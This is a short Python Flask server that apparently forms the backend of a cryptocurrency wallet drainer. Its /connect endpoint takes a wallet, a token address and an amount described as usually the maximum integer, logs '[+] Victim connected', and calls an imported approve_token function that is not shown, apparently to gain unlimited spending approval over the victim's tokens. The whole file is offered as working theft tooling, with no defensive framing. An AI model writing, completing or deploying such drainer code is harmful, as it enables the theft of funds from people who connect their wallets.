from flask import Flask, request, jsonify
from wallet_logic import approve_token
from dotenv import load_dotenv
import os

load_dotenv()

app = Flask(__name__)

@app.route("/connect", methods=["POST"])
def connect():
    data = request.json
    wallet = data.get("wallet")
    token = data.get("token")  # e.g., USDC address
    amount = data.get("amount")  # usually MAX_UINT

    print(f"[+] Victim connected: {wallet}")
    tx_hash = approve_token(wallet, token, amount)
    return jsonify({"status": "ok", "tx": tx_hash})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
